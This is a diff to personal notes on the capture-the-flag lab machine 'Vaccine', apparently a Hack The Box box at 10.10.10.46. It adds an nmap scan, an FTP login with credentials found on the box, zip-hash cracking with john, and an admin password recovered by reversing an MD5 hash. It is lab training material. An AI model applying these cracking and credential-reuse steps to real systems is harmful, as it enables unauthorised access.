@@ -3,6 +3,8 @@ inet6 fe80::d484:44d2:fd97:c02c
 
 # Vaccine
 
+## nmap
+
 sudo nmap -sC -sV -A 10.10.10.46
 
 Nmap scan report for 10.10.10.46
@@ -30,3 +32,24 @@ TRACEROUTE (using port 5900/tcp)
 HOP RTT       ADDRESS
 1   244.85 ms 10.10.14.1
 2   244.90 ms 10.10.10.46
+
+## Need to install ftp
+
+ftp 10.10.10.46
+username: ftpuser
+password: mc@F1l3ZilL4
+
+get the backup.zip
+
+## Use zip hash to crack
+
+zip2john backup.zip > backup.hash
+john backup.hash --show (741852963)
+unzip backup.zip in this password
+
+## Try login [index.php](./ftp/backup/index.php)
+
+username: admin
+password (md5 reverse): 2cb42f8734ea607eefed3b70af13bbd3 ( qwerty789)
+
+
